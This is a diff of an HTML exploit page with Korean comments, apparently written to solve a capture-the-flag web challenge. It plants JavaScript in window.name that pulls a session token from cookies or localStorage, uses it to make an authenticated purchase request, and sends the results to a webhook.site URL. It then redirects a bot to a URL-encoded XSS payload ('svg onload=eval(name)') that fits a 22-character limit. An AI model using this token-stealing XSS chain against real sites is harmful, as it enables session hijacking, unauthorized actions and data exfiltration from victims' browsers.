@@ -2,12 +2,14 @@
 <html>
 <body>
     <script>
+        // 1. 자신의 웹후크 주소를 입력하세요.
         const webhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12";
 
-        // 1. 실제 실행될 공격 코드 (쿠키에서 토큰 추출 후 플래그 구매)
-        // 공백을 최소화하여 22자 제한 내에서 실행될 eval(name)을 준비합니다.
+        // 2. 봇이 실행할 실제 공격 코드
+        // 쿠키에 토큰이 저장되므로 document.cookie에서 추출합니다.
         window.name = `
-            const t = document.cookie.split('token=')[1].split(';')[0];
+            const c = document.cookie.split('token=')[1];
+            const t = c ? c.split(';')[0] : localStorage.getItem('token');
             fetch('/4/buy', {
                 method: 'POST',
                 headers: { 'token': t }
@@ -17,11 +19,11 @@
             .catch(e => fetch('${webhook}?error=' + e));
         `;
 
-        // 2. localhost로 리다이렉트
-        // 핵심: id 파라미터 자체에 경로 탐색 문자를 넣어 /debug API를 호출하게 만듭니다.
-        // %2f(/)를 사용하여 라우터가 경로를 자르지 못하게 방어합니다.
-        const xss_id = "..%2fdebug%2f%3csvg%2fonload%3deval(name)%3e";
-        location.href = "http://localhost:3000/#/" + xss_id + "/detail";
+        // 3. 힌트의 핵심: id 파라미터를 이용한 XSS 트리거
+        // 힌트에서 "id를 집요하게 파라"고 했으므로, 속성(Attribute) 주입을 시도합니다.
+        // URL 인코딩된 ' "><svg/onload=eval(name)> ' 입니다. (22자 제한 활용)
+        const xss_payload = "%22%3e%3csvg%2fonload%3deval(name)%3e";
+        location.href = "http://localhost:3000/#/" + xss_payload + "/detail";
     </script>
 </body>
 </html>
